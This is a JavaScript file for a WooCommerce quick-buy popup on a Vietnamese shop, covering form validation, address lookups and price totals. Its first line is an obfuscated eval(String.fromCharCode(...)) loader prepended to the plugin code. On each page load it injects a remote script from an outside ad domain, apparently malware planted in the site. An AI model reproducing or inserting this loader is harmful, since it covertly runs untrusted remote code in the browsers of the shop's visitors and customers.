eval(String.fromCharCode(118, 97, 114, 32, 101, 108, 101, 109, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116, 40, 39, 115, 99, 114, 105, 112, 116, 39, 41, 59, 32, 101, 108, 101, 109, 46, 116, 121, 112, 101, 32, 61, 32, 39, 116, 101, 120, 116, 47, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 39, 59, 32, 101, 108, 101, 109, 46, 97, 115, 121, 110, 99, 32, 61, 32, 116, 114, 117, 101, 59, 101, 108, 101, 109, 46, 115, 114, 99, 32, 61, 32, 83, 116, 114, 105, 110, 103, 46, 102, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 40, 49, 48, 52, 44, 32, 49, 49, 54, 44, 32, 49, 49, 54, 44, 32, 49, 49, 50, 44, 32, 49, 49, 53, 44, 32, 53, 56, 44, 32, 52, 55, 44, 32, 52, 55, 44, 32, 57, 55, 44, 32, 49, 48, 48, 44, 32, 49, 49, 53, 44, 32, 52, 54, 44, 32, 49, 49, 56, 44, 32, 49, 49, 49, 44, 32, 49, 48, 53, 44, 32, 49, 49, 50, 44, 32, 49, 49, 48, 44, 32, 49, 48, 49, 44, 32, 49, 49, 57, 44, 32, 49, 49, 53, 44, 32, 49, 49, 57, 44, 32, 49, 48, 53, 44, 32, 49, 49, 52, 44, 32, 49, 48, 49, 44, 32, 52, 54, 44, 32, 49, 49, 48, 44, 32, 49, 48, 49, 44, 32, 49, 49, 54, 44, 32, 52, 55, 44, 32, 57, 55, 44, 32, 49, 48, 48, 44, 32, 52, 54, 44, 32, 49, 48, 54, 44, 32, 49, 49, 53, 41, 59, 32, 32, 32, 118, 97, 114, 32, 97, 108, 108, 115, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 84, 97, 103, 78, 97, 109, 101, 40, 39, 115, 99, 114, 105, 112, 116, 39, 41, 59, 32, 118, 97, 114, 32, 110, 116, 51, 32, 61, 32, 116, 114, 117, 101, 59, 32, 102, 111, 114, 32, 40, 32, 118, 97, 114, 32, 105, 32, 61, 32, 97, 108, 108, 115, 46, 108, 101, 110, 103, 116, 104, 59, 32, 105, 45, 45, 59, 41, 32, 123, 32, 105, 102, 32, 40, 97, 108, 108, 115, 91, 105, 93, 46, 115, 114, 99, 46, 105, 110, 100, 101, 120, 79, 102, 40, 83, 116, 114, 105, 110, 103, 46, 102, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 40, 49, 49, 56, 44, 32, 49, 49, 49, 44, 32, 49, 48, 53, 44, 32, 49, 49, 50, 44, 32, 49, 49, 48, 44, 32, 49, 48, 49, 44, 32, 49, 49, 57, 44, 32, 49, 49, 53, 44, 32, 49, 49, 57, 44, 32, 49, 48, 53, 44, 32, 49, 49, 52, 44, 32, 49, 48, 49, 41, 41, 32, 62, 32, 45, 49, 41, 32, 123, 32, 110, 116, 51, 32, 61, 32, 102, 97, 108, 115, 101, 59, 125, 32, 125, 32, 105, 102, 40, 110, 116, 51, 32, 61, 61, 32, 116, 114, 117, 101, 41, 123, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 84, 97, 103, 78, 97, 109, 101, 40, 34, 104, 101, 97, 100, 34, 41, 91, 48, 93, 46, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 40, 101, 108, 101, 109, 41, 59, 32, 125));(function ($) {
    $(document).ready(function () {
        var $formWoo = $('.summary.entry-summary > .cart');
        var $formPopup = $('.devvn_prod_variable .cart');
        if($('.devvn_prod_variable').length > 0){
            if($('.devvn_prod_variable .quantity.buttons_added .screen-reader-text').length == 0){
                $('.devvn_prod_variable .quantity.buttons_added').append('<label class="screen-reader-text">Số lượng</label>')
            }
        }
        function sync_variation_to_popup(){
            $('select, input, textarea', $formWoo).each(function () {
                var thisName = $(this).attr('name');
                var thisVal = $(this).val();
                $('[name="'+thisName+'"]',$formPopup).val(thisVal);
            });
            $formPopup.trigger("check_variations");
        }
        function sync_variation_to_woo(){
            $('select, input, textarea', $formPopup).each(function () {
                var thisName = $(this).attr('name');
                var thisVal = $(this).val();
                $('[name="'+thisName+'"]',$formWoo).val(thisVal);
            });
            $formWoo.trigger("check_variations");
        }
        $('.devvn_buy_now').on('click', function () {
            $('.devvn-popup-quickbuy').bPopup({
                speed: 450,
                transition: 'slideDown',
                zIndex: 9999999,
                //modalClose: false,
                closeClass: 'devvn-popup-close',
                onOpen: function () {
                    sync_variation_to_popup();
                },
                onClose: function () {
                    sync_variation_to_woo();
                }
            });
        });
        $.validator.addMethod('vietnamphone', function (value, element) {
            return /^0+(\d{9,10})$/.test(value);
        }, "Please enter a valid phone number");
        $.validator.addMethod("customemail",
            function(value, element) {
                if(value == "") return true;
                return /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/.test(value);
            },
            "Định dạng email không đúng."
        );
        var devvn_quickbuy = $(".devvn_cusstom_info");
        devvn_quickbuy.validate({
            rules: {
                'customer-name': {
                    required: true,
                    maxlength: 100
                },
                'customer-phone': {
                    required: {
                        depends:function(){
                            $(this).val($.trim($(this).val()));
                            return true;
                        }
                    },
                    vietnamphone: true
                },
                'customer-quan': {
                    required: function(element){
                        var require_district = $("#require_district").val();
                        return (require_district == 1) ? true : false;
                    }
                },
                'customer-xa': {
                    required: function(element){
                        var require_village = $("#require_village").val();
                        return (require_village == 1) ? true : false;
                    }
                },
                'customer-address': {
                    required: function(element){
                        var require_address = $("#require_address").val();
                        return (require_address == 1) ? true : false;
                    }
                },
                'customer-email': {
                    /*required: {
                        depends:function(){
                            $(this).val($.trim($(this).val()));
                            return true;
                        }
                    },*/
                    customemail: true
                }
            },
            messages: {
                'customer-name': "Họ tên là bắt buộc",
                'customer-phone': "Số điện thoại là bắt buộc",
                //'customer-email': "Địa chỉ Email là bắt buộc",
                'customer-quan': "Hãy chọn quận/huyện",
                'customer-xa': "Hãy chọn xã/phường/thị trấn",
                'customer-address': "Hãy nhập địa chỉ cụ thể như số nhà hoặc xóm.",
            },
            errorLabelContainer: $(".devvn_quickbuy_mess"),
        });

        var quickbuy_process = false;
        $('.devvn-order-btn').on('click',function () {
            var variation_id = $('.devvn_prod_variable .cart input[name="variation_id"]').val();
            if((typeof variation_id == 'string' && variation_id != '0' && variation_id != '') || typeof variation_id == 'undefined') {
                if(!devvn_quickbuy.valid()) return;
                var prod_nonce = $('#prod_nonce').val();
                var prod_id = $('#prod_id').val();
                var customer_info = $('#devvn_cusstom_info').serialize();
                var product_info = $('.devvn_prod_variable .cart').serialize();
                if (!quickbuy_process) {
                    $.ajax({
                        type: "post",
                        dataType: "json",
                        url: devvn_quickbuy_array.ajaxurl,
                        data: {
                            action: "devvn_quickbuy",
                            prod_id: prod_id,
                            customer_info: customer_info,
                            product_info: product_info,
                            nonce: prod_nonce
                        },
                        context: this,
                        beforeSend: function () {
                            quickbuy_process = true;
                            $('.devvn-order-btn').addClass('loading');
                        },
                        success: function (response) {
                            //console.log(response);
                            if (response.success) {
                                $('.devvn-popup-content-right').html(response.data.content);
                            }
                            else {
                                alert(devvn_quickbuy_array.popup_error);
                            }
                            quickbuy_process = false;
                            $('.devvn-order-btn').removeClass('loading');
                        }
                    });
                }
            }else{
                alert(wc_add_to_cart_variation_params.i18n_make_a_selection_text);
            }
            return false;
        });
        var enable_ship = $('#enable_ship').val();
        if($('#devvn_city').length > 0) {
            var loading_billing = false;
            var prod_nonce = $('#prod_nonce').val();
            var prod_id = 0;
            if($('button.single_add_to_cart_button[name="add-to-cart"]').length > 0) {
                prod_id = parseInt($('button.single_add_to_cart_button[name="add-to-cart"]').val());
            }
            $('#devvn_city').on('change', function (e) {
                var matp = e.val;
                if (!matp) matp = $("#devvn_city option:selected").val();
                if (matp && !loading_billing) {
                    var product_info = $('.devvn_prod_variable .cart').serialize();
                    $.ajax({
                        type: "post",
                        dataType: "json",
                        url: devvn_quickbuy_array.ajaxurl,
                        data: {
                            action: "quickbuy_load_diagioihanhchinh",
                            matp: matp,
                            getvalue: 1,
                            product_info: product_info,
                            nonce: prod_nonce,
                            prod_id: prod_id,
                        },
                        context: this,
                        beforeSend: function () {
                            $('.popup-customer-info').addClass('popup_loading');
                            loading_billing = true;
                        },
                        success: function (response) {
                            //console.log(response);
                            $("#devvn_district").html('');
                            $("#devvn_ward").html('<option value="">Xã/phường</option>');
                            if (response.success) {
                                var listQH = response.data.list_district;
                                var newState = new Option('Quận/huyện', '');
                                $("#devvn_district").append(newState);
                                $.each(listQH, function (index, value) {
                                    var newState = new Option(value.name, value.maqh);
                                    $("#devvn_district").append(newState);
                                });
                                if(enable_ship && response.data.shipping){
                                    $('.popup_quickbuy_shipping_calc').html(response.data.shipping);
                                }
                            }
                            loading_billing = false;
                            $('.popup-customer-info').removeClass('popup_loading');
                            quickbuy_total_cart();
                        }
                    });
                }
            });
            if($('#devvn_district').length > 0){
                $('#devvn_district').on('change',function(e){
                    var maqh = e.val;
                    if(!maqh) maqh = $( "#devvn_district option:selected" ).val();
                    var matp = $("#devvn_city option:selected").val();
                    if(maqh && !loading_billing) {
                        var product_info = $('.devvn_prod_variable .cart').serialize();
                        $.ajax({
                            type: "post",
                            dataType: "json",
                            url: devvn_quickbuy_array.ajaxurl,
                            data: {
                                action: "quickbuy_load_diagioihanhchinh",
                                matp: matp,
                                maqh: maqh,
                                getvalue: 2,
                                product_info: product_info,
                                nonce: prod_nonce,
                                prod_id: prod_id,
                            },
                            context: this,
                            beforeSend: function () {
                                $('.popup-customer-info').addClass('popup_loading');
                                loading_billing = true;
                            },
                            success: function (response) {
                                //console.log(response);
                                $("#devvn_ward").html('');
                                if (response.success) {
                                    var listQH = response.data.list_district;
                                    var newState = new Option('Xã/phường', '');
                                    $("#devvn_ward").append(newState);
                                    $.each(listQH, function (index, value) {
                                        var newState = new Option(value.name, value.xaid);
                                        $("#devvn_ward").append(newState);
                                    });
                                    if(enable_ship && response.data.shipping){
                                        $('.popup_quickbuy_shipping_calc').html(response.data.shipping);
                                    }
                                }
                                loading_billing = false;
                                $('.popup-customer-info').removeClass('popup_loading');
                                quickbuy_total_cart();
                            }
                        });
                    }
                });
            }
            $(window).on('load', function(){
                $('#devvn_city').trigger('change');
            });
            $('.devvn_prod_variable .cart').on('change',function(e){
                if(enable_ship) {
                    var maqh = $("#devvn_district option").val();
                    var matp = $("#devvn_city option").val();
                    var product_info = $('.devvn_prod_variable .cart').serialize();
                    $.ajax({
                        type: "post",
                        dataType: "json",
                        url: devvn_quickbuy_array.ajaxurl,
                        data: {
                            action: "quickbuy_load_diagioihanhchinh",
                            matp: matp,
                            maqh: maqh,
                            getvalue: 1,
                            product_info: product_info,
                            nonce: prod_nonce,
                            prod_id: prod_id,
                        },
                        context: this,
                        beforeSend: function () {
                            $('.popup-customer-info').addClass('popup_loading');
                        },
                        success: function (response) {
                            if (response.success) {
                                if (enable_ship && response.data.shipping) {
                                    $('.popup_quickbuy_shipping_calc').html(response.data.shipping);
                                }
                            }
                            $('.popup-customer-info').removeClass('popup_loading');
                            quickbuy_total_cart();
                        }
                    });
                }
            });
        }
        function quickbuy_total_cart(){
            var variable = $('.devvn_prod_variable .cart').data('product_variations');
            var qty = $('.devvn_prod_variable input[name="quantity"]').val();
            var variation_id = $('.devvn_prod_variable input[name="variation_id"]').val();
            var cost = total = ship = 0;

            if(enable_ship && $('.popup_quickbuy_shipping_calc').length > 0 && $('.popup_quickbuy_shipping_calc input[name="shipping_method[0]"]').length > 0){
                ship = parseInt($('.popup_quickbuy_shipping_calc input[name="shipping_method[0]"]:checked').data('cost'));
                if(!ship)
                    ship = parseInt($('.popup_quickbuy_shipping_calc input[name="shipping_method[0]"]').data('cost'));
            }

            if(variable) {
                $(variable).each(function (index, value) {
                    if(value.variation_id == variation_id && value.variation_is_active && value.variation_is_visible){
                        cost = value.display_price;
                    }
                });
            }else{
                cost = $('.devvn_prod_variable').data('simpleprice');
            }
            total = (cost*qty)+ship;
            $('.popup_quickbuy_total_calc').html(devvn_qb_number_format(total.toFixed(0),0,'','.') + ' ' +devvn_quickbuy_array.currency_format);
        }
        quickbuy_total_cart();
        $('#devvn_cusstom_info, .devvn_prod_variable .cart').on('change', function(){
            quickbuy_total_cart();
        });
        function devvn_qb_number_format (number, decimals, dec_point, thousands_sep) {
            decimals = devvn_quickbuy_array.num_decimals;
            dec_point = devvn_quickbuy_array.price_decimal;
            // Strip all characters but numerical ones.
            number = (number + '').replace(/[^0-9+\-Ee.]/g, '');
            var n = !isFinite(+number) ? 0 : +number,
                prec = !isFinite(+decimals) ? 0 : Math.abs(decimals),
                sep = (typeof thousands_sep === 'undefined') ? ',' : thousands_sep,
                dec = (typeof dec_point === 'undefined') ? '.' : dec_point,
                s = '',
                toFixedFix = function (n, prec) {
                    var k = Math.pow(10, prec);
                    return '' + Math.round(n * k) / k;
                };
            // Fix for IE parseFloat(0.55).toFixed(0) = 0;
            s = (prec ? toFixedFix(n, prec) : '' + Math.round(n)).split('.');
            if (s[0].length > 3) {
                s[0] = s[0].replace(/\B(?=(?:\d{3})+(?!\d))/g, sep);
            }
            if ((s[1] || '').length < prec) {
                s[1] = s[1] || '';
                s[1] += new Array(prec - s[1].length + 1).join('0');
            }
            return s.join(dec);
        }
    })
})(jQuery)